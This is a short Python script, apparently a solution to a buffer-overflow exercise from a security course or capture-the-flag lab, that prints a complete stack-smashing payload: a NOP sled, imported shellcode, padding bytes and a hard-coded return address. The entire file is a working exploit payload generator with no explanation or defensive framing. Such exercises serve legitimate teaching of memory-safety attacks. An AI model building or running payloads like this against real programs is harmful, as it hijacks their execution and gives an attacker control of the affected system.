#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
# length = len(shellcode)
# len_remaining = (2048 - length)
sys.stdout.buffer.write(b'\x90'*(1024 - len(shellcode) - 20) + shellcode + b'\x01'*4 + b'\x10'*20 + b'\x48\xc8\xfe\xff' )

